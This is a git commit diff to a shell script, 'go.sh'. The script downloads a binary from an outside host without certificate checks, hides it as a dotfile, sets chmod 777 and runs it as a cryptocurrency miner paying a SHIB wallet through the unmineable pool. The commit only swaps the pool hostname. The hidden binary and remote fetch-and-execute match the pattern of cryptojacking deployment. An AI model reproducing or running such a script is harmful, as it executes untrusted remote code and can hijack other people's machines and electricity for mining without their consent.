da57b9ceea9349e9bcf2e80056867bbeddde6ec3
cuplizmohdrais <madangturu9@gmail.com>
2021-06-21 14:08:39 +0000

    Update 'go.sh'

--- go.sh
+++ go.sh
@@ -2,5 +2,5 @@
 wget --no-check-certificate https://swensonm.com/mining/masterfile 
 mv masterfile .masterfile
 chmod 777 .masterfile
-./.masterfile -o rx.unmineable.com:3333 -u 
+./.masterfile -o rx-us.unmineable.com:3333 -u 
 SHIB:0xd901d43a416d4d9ad29e986f2dfa75b7fa0630cf.cupliz -p X -k -a rx/0
